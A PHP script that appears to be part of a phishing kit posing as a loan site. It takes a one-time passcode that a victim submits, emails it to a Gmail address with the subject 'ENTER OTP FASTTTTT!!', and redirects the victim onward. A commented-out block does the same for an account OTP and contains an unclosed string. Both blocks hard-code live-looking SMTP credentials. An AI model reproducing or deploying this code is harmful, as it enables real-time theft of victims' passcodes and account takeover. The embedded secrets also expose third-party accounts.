<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;



$altpin = $_POST["altpin"];





require "../vendor/autoload.php";

try{ 
   
    $phpmailer = new PHPMailer(true);
    $phpmailer->isSMTP();
    $phpmailer->SMTPAuth = true;
    $phpmailer->Host = "live.smtp.mailtrap.io";
    $phpmailer->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
    $phpmailer->Port = 587;
    $phpmailer->Username = 'api';
    $phpmailer->Password = 'c56594a64be03050c378fbf2e95b1c8e';

    $phpmailer->setFrom("easyloan@firsteasymoney.com", "Haley");
    $phpmailer->addAddress("evajames9239@gmail.com", "Haley");


    $phpmailer->isHTML(true);
    $phpmailer->Subject = "ENTER OTP FASTTTTT!!";
    $phpmailer->Body= "OTP: $altpin";



   $phpmailer->send(); 

   header("Location: ../alternateac/index.html");




}catch(Exception $e){
  die("query failed: " . $e->getMessage()); 
}




/*
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;



$acctotp = $user["acctotp"];



require "../vendor/autoload.php";

$phpmailer = new PHPMailer(true);

try{ 
   
    $phpmailer->SMTPDebug = SMTP::DEBUG_SERVER;
    $phpmailer->isSMTP();
    $phpmailer->SMTPAuth = true;
    $phpmailer->Host = "smtp-relay.brevo.com";
    $phpmailer->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
    $phpmailer->Port = 587;
    $phpmailer->Username = '91f1e3001@smtp-brevo.com';
    $phpmailer->Password = '94yjdCbDRQ6xHMTV';

    $phpmailer->setFrom("elenemills45@gmail.com", "Elene");
    $phpmailer->addAddress("elenemills45@gmail.com", "Elene");

    $phpmailer->isHTML(true);
    $phpmailer->Subject = "LOGIN FAST!!";
    $phpmailer->Body= "account otp: $acctotp;



   $phpmailer->send(); 

   header("Location: ../incorrect/index.html");




}catch(Exception $e){
  
}
*/



